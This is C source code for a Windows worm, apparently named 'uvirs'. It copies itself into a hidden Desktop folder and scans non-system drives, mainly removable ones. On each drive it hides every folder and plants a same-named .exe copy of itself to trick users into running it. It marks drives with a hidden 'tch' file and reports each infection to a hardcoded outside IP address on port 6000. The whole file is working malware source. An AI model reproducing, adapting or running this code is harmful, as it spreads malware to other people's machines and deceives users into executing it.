
#define PSAPI_VERSION 1
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <Psapi.h>
#include "debug.h"

//***********************************************************************************************//
//  NetScheduleJobAdd                                                                            //
//  https://docs.microsoft.com/zh-cn/windows/desktop/TaskSchd/task-scheduler-2-0-interfaces      //
//                                                                                               //
//***********************************************************************************************//

#define IN_FUNCTION()   dprintf("function : %s, line : %d in\n",__FUNCTION__, __LINE__);
#define IN_OUT()        dprintf("function : %s, line : %d out\n",__FUNCTION__, __LINE__);

typedef struct _Nlist {
   char DriverNameRoot[200];
   struct _Nlist *next;
} *LIST;

DWORD   UserNameSz;
static  char UserName[200];
static  char GlobalWorkDircetory[1024] = "C:\\Users\\";
static  char Pwd[1024];
static  char OldPwd[1024];
static  char CommonBuffer1[1024];
static  char CommonBuffer2[1024];
static  char ProgramName[256];
static  char FullProgramPath[1024];


#define MYNAME      "uvirs"
#define MYNAMEAPP   "uvirs.exe"

void DBGWriteCon(char *fmt, ... );
char IfIamUVIRES(char *name);
void DetachWindows(void);
BOOL CheckTheProcessIsRun(char *ProcessName);
BOOL CreateDirctory(char *dirname);
int  HiddenFileDirctory(char *fdirname);
char CopyTo(char *from, char *to);
BOOL RunProcess(char *pname);
void do_really_work(void);
void Search_WorkList(LIST *pList);
void Finish_WorkList(LIST listHead);
void Free_WorkList(LIST listHead);
BOOL CheckThisDriveIsInfection(char *DriverRoot);
BOOL Infection(char *DriverRoot);
void SetInfecttionIs(char *DriverRoot);
void AnalyzeTheCommondLine(void);
BOOL SendMessageToserver(void);


int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    PSTR szCmdline, int iCmdShow)
{
    //
    // DetachWindows Noting to do. Just return 1;
    // 
    DWORD strsz;
    
    //
    //  Init Debug System.
    // 
    Init_Debug();
   
    DetachWindows();


    
    AnalyzeTheCommondLine();
    
    
    
    UserNameSz = 200;
    if (!GetUserName(UserName, &UserNameSz)) {
        MessageBox(NULL, "UVIRES", "GetUserName False", MB_ABORTRETRYIGNORE);
        return 0;
    }
    

    
    strcat(GlobalWorkDircetory, UserName);
    strcat(GlobalWorkDircetory, "\\Desktop\\");
    
    
    
    GetCurrentDirectory(sizeof(Pwd), Pwd);
    dprintf("GetCurrentDirectory: %s\n", Pwd);

    IN_FUNCTION();
    
    if (!IfIamUVIRES(ProgramName)) {
        
        
        CommonBuffer1[0] = 0;
        strcat(CommonBuffer1, "explorer ");
        strcat(CommonBuffer1, ProgramName);
        HiddenFileDirctory("Debug.log");
        dprintf("RunProcess : %s\n", CommonBuffer1);
        RunProcess(CommonBuffer1);
       
        
        if (CheckTheProcessIsRun(MYNAME)) {

            return 0;
        }
        if(!SetCurrentDirectory(GlobalWorkDircetory)) {
           
        }
        
        if (!CreateDirctory(MYNAME)) {
           
        }
        HiddenFileDirctory(MYNAME);
        CommonBuffer1[0] = 0;
        CommonBuffer2[0] = 0;
        
        strcat(CommonBuffer1, Pwd);
        strcat(CommonBuffer1, "\\");
        strcat(CommonBuffer1, ProgramName);
        strcat(CommonBuffer1, ".exe");
        
        strcat(GlobalWorkDircetory, MYNAME);
        strcat(GlobalWorkDircetory, "\\");
        
        strcat(CommonBuffer2, GlobalWorkDircetory);
        
        strcat(CommonBuffer2, MYNAMEAPP);
        //
        // CopyTo, makeself.
        //
        CopyTo(CommonBuffer1, CommonBuffer2);


        
        SetCurrentDirectory(GlobalWorkDircetory);

  
        //
        //  Run this child Body.
        //
        dprintf("RunProcess %s\n", CommonBuffer2);
        RunProcess(CommonBuffer2);
        Release_Debug();
        
        return 0;
    }

    FullProgramPath[0] = 0;
    strcat(FullProgramPath, Pwd);
    strcat(FullProgramPath, "\\uvirs.exe");
    
    //
    // the uvirs work.
    //
    //SendMessageToserver();
    do_really_work();
    
    IN_OUT();
    
    Release_Debug();
    return 0;
    
}

void DetachWindows(void)
{
    IN_FUNCTION();
    return ;

}
int HiddenFileDirctory(char *fdirname)
{
    BOOL status;
    IN_FUNCTION();
    dprintf("HiddenFile : %s\n",fdirname);
    status = SetFileAttributesA(fdirname, FILE_ATTRIBUTE_HIDDEN);
    if (!status) {
        dprintf("HiddenFile %s, Error : %d\n", fdirname, GetLastError());
    }else {
        dprintf("HiddenFile : %s ssuccessfull \n",fdirname);
    }
    return status;
    
}
char IfIamUVIRES(char *name)
{
    IN_FUNCTION();
    dprintf("ProcessName : %s\n", ProgramName);
    dprintf("Name : %s\n", name);
    return !strcmp(name, MYNAME);
}

char CopyTo(char *from, char *to)
{
    HANDLE DircHandle;
    HANDLE TestHandle;
    char *buffer;
    DWORD readzize;
    DWORD writeszie;
    
    IN_FUNCTION();
    
    DircHandle = CreateFile(from,
                            GENERIC_READ,
                            FILE_SHARE_READ,
                            NULL,
                            OPEN_EXISTING,
                            0,
                            NULL);

    TestHandle = CreateFile(to,
                            GENERIC_WRITE,
                            FILE_SHARE_WRITE,
                            NULL,
                            CREATE_ALWAYS,
                            0,
                            NULL);
    if (DircHandle == INVALID_HANDLE_VALUE) {
        dprintf("Copy From %s Error:%d\n", from, GetLastError());
        return 0;
    }
    if (TestHandle == INVALID_HANDLE_VALUE) {
        dprintf("Copy To %s Error:%d\n", to, GetLastError());
        return 0;
    }
                            
    buffer = (char *)malloc(4096);
    
    assert(buffer);
    
    while (ReadFile(DircHandle,
                    buffer, 
                    4096, 
                    &readzize, 
                    NULL)) {
        if (!readzize) {
            break;
            
        }
        if(!WriteFile(  TestHandle,
                        buffer,
                        readzize,
                        &writeszie,
                        NULL
                        )) {
             return 0;
        }
        
    }
    free(buffer);
    CloseHandle(TestHandle);
    CloseHandle(DircHandle); 
    return 0;
}

void do_really_work(void)
{
    LIST listHead;
    IN_FUNCTION();
    while (1) {
        Search_WorkList(&listHead);
        Finish_WorkList(listHead);
        dprintf("Finish_WorkList\n");
        Free_WorkList(listHead);
        Sleep(5000);
    }
}
BOOL RunProcess(char *pname)
{
    BOOL status;
    PROCESS_INFORMATION processinfo;
    STARTUPINFOA startupinfo;
    IN_FUNCTION();
    ZeroMemory(&processinfo, sizeof(processinfo));
    ZeroMemory(&startupinfo, sizeof(startupinfo));
    
    startupinfo.cb = sizeof(startupinfo);
    
    status = CreateProcessA(NULL,
                            pname,
                            NULL,
                            NULL,
                            FALSE,
                            CREATE_NO_WINDOW,
                            NULL,
                            NULL,
                            &startupinfo,
                            &processinfo
                  );
    
    return status;
}

BOOL CheckTheProcessIsRun(char *ProcessName)
{
    DWORD aProcesses[1024];
    DWORD cbNeeded;
    DWORD cProcesses;
    HMODULE hMod;
    int i;
    char  szProcessName[MAX_PATH] = "unknown";
    HANDLE hProcess;
    IN_FUNCTION();
 
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        dprintf("EnumProcesses False\n");
        return 1;
    }
    
    cProcesses = cbNeeded / sizeof(DWORD);

    for (i = 0; i < cProcesses; i++) {
        if(aProcesses[i] != 0) {
            dprintf("processId %d\n", aProcesses[i]);
            hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
                                    PROCESS_VM_READ,
                                    FALSE, aProcesses[i]);
            if (hProcess != NULL) {
                
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                        GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(char));
                        szProcessName[strlen(szProcessName) - 4] = 0;
                        dprintf("processname : %s\n", szProcessName);
                        if (!strcmp(szProcessName, ProcessName)) {
                            CloseHandle(hProcess);
                            dprintf("szProcessName : %s, ProcessName:%s\n is find\n", szProcessName, ProcessName);
                            return 1;
                        }
                }
                CloseHandle(hProcess);
            } else {
                dprintf("processId :%d\n", aProcesses[i]);
            }
        }
    }
    return 0;
}

BOOL CreateDirctory(char *dirname)
{
    IN_FUNCTION();
    return CreateDirectory(dirname, NULL);
    
}
void Search_WorkList(LIST *pList)
{
    char c;
    LIST list;
    LIST list_tail;
    int flag;
    int m;
    char buffer[20] = "A:\\";
    flag = 1;
    c = 'A';
    m = 0;
    IN_FUNCTION();
    while (c <= 'Z') {
        buffer[0] = c;
        //
        //dprintf("driver %s is checking\n", buffer);
        //
        
        //
        // for usb interfaces , use GetDriveType == DRIVE_REMOVABLE
        //
        if (GetDriveType(buffer) != DRIVE_NO_ROOT_DIR && GetDriveType(buffer) != DRIVE_CDROM && buffer[0] != 'C'
                                && !CheckThisDriveIsInfection(buffer)) {
            //
            // dprintf("driver %s\n is checkout\n", buffer);
            //
            m++;
            if (flag == 0) {
                list->next = (LIST)malloc(sizeof(*list));
                list = list->next;
            } else {
                list = (LIST)malloc(sizeof(*list));
            }
            list->DriverNameRoot[0] = 0;
            strcat(&(list->DriverNameRoot[0]), buffer);
            list->next = NULL;
            if (flag) {
                *pList = list;
                flag = 0;
            }
        }
        c++;
    }
    if (m == 0) {
        dprintf("*pList : NULL\n");
        
        *pList = NULL;
    }
    
#ifdef DBG
    list_tail = *pList;
    while (list_tail != NULL) {
        dprintf("DriverNameRoot : %s\n", list_tail->DriverNameRoot);
        list_tail = list_tail->next;
    }
    dprintf("finished Search_WorkList\n");
#endif
    
}
void Finish_WorkList(LIST listHead)
{
    IN_FUNCTION();
    while (listHead != NULL) {
        SetCurrentDirectory(&(listHead->DriverNameRoot[0]));
        Infection(&(listHead->DriverNameRoot[0]));
        SendMessageToserver();
        SetInfecttionIs(&(listHead->DriverNameRoot[0]));
        SetCurrentDirectory(Pwd);
        listHead = listHead->next;
    }
    
}
void Free_WorkList(LIST listHead)
{
    LIST list;
    IN_FUNCTION();
    while (list = listHead) {
        listHead = list->next;
        free(list);
    }
    
}
BOOL CheckThisDriveIsInfection(char *DriverRoot)
{
    char buffer[256];
    WIN32_FIND_DATA findDate;
    HANDLE findHandle;
    
    buffer[0] = 0;
    IN_FUNCTION();
    strcat(buffer, DriverRoot);
    strcat(buffer, "tch");
    
    findHandle = FindFirstFile(buffer, &findDate);
    
    FindClose(findHandle);
                                        
    return findHandle == INVALID_HANDLE_VALUE ? 0 : 1;
    
    
    
}
BOOL Infection(char *DriverRoot)
{
    char buffer[256];
    char commbuffer[256];
    WIN32_FIND_DATA findDate;
    HANDLE findHandle;
    int flag;
    LIST listHead;
    LIST list;
    int worksize;
    int i;
    int m;
    flag = 1;
    worksize = 0;
    IN_FUNCTION();
    buffer[0] = 0;
    strcat(buffer, DriverRoot);
    strcat(buffer, "*");
    dprintf("searchpath : %s\n", buffer);
    listHead = NULL;
    findHandle = FindFirstFile(buffer, &findDate);
    /*if (INVALID_HANDLE_VALUE != findHandle) {
        commbuffer[0] = 0;
        strcat(commbuffer, &listHead->DriverNameRoot[0]);
        HiddenFileDirctory(&listHead->DriverNameRoot[0]);
        dprintf("HiddenFileDirctory : \n",&listHead->DriverNameRoot[0]);
        strcat(commbuffer, ".exe");
        CopyTo(FullProgramPath, commbuffer);
    }*/
    while (FindNextFile(findHandle, &findDate)) {
        dprintf("each file : %s\n", findDate.cFileName);
        if(!strcmp(findDate.cFileName, ".") || !strcmp(findDate.cFileName, ".."))
            break;
        if (findDate.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            worksize++;
            if (flag == 0) {
                list->next = (LIST)malloc(sizeof(*list));
                list = list->next;
            } else {
                list = (LIST)malloc(sizeof(*list));
            }
            list->DriverNameRoot[0] = 0;
            strcat(&(list->DriverNameRoot[0]), findDate.cFileName);
            list->next = NULL;
            if (flag) {
                listHead = list;
                flag = 0;
            }

        }
    }
    for (i = 0; i < worksize; i++) {
        dprintf("worksize :%d\n", worksize);
        commbuffer[0] = 0;
        strcat(commbuffer, &listHead->DriverNameRoot[0]);
        HiddenFileDirctory(&listHead->DriverNameRoot[0]);
        dprintf("HiddenFileDirctory : \n",&listHead->DriverNameRoot[0]);
        strcat(commbuffer, ".exe");
        CopyTo(FullProgramPath, commbuffer);
        dprintf("CopyTo from %s,to %s\n", FullProgramPath, commbuffer);
        list = listHead->next;
        free(listHead);
        listHead = list;
    }
    FindClose(findHandle);
    
    return TRUE;
}
void SetInfecttionIs(char *DriverRoot)
{
    
    FILE *fp = fopen("tch", "w+");
    IN_FUNCTION();
    if (fp == NULL) {
        dprintf("SetInfecttionIs : %s Error , %s\n", DriverRoot, strerror(errno));
        return ;
    }
    fclose(fp);
    HiddenFileDirctory("tch");
    return;
}

void AnalyzeTheCommondLine(void)
{
    //
    // Must keep that, the GetCommandLine().
    //

    char *str;
    int begin;
    int end;
    int len;
    int i;

    str = GetCommandLine();
    IN_FUNCTION();
    dprintf("GetCommandLine : %s\n", str);
    
    
    len = strlen(str);

    while (str[len] != '.') {
        len--;
    }
    dprintf("len : %d\n", len);
    begin = len;
    i = 0;
    while (str[begin] != '\\') {
        begin--;
    }
    begin += 1;
    
    while (begin < len) {
        ProgramName[i] = str[begin];
        begin++;
        i++;
    }
    
    assert(i <= 256);
    ProgramName[i] = 0;

}
BOOL SendMessageToserver(void)
{
    
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;
    SOCKET sockClient;
    SOCKADDR_IN addrSrv;
    char receBuf[100];
    wVersionRequested = MAKEWORD(1, 1);
    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        return FALSE;
    }
    if (LOBYTE( wsaData.wVersion ) != 1 || HIBYTE( wsaData.wVersion ) != 1) {
        WSACleanup();
        return FALSE;
    }

    sockClient = socket(AF_INET,SOCK_STREAM,0);
    addrSrv.sin_addr.S_un.S_addr = inet_addr("59.110.225.100");
    addrSrv.sin_family = AF_INET;
    addrSrv.sin_port = htons(6000);

    connect(sockClient,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));

    send(sockClient,"a",strlen("a") + 1 ,0);

    closesocket(sockClient);
    WSACleanup();
    return TRUE;
}
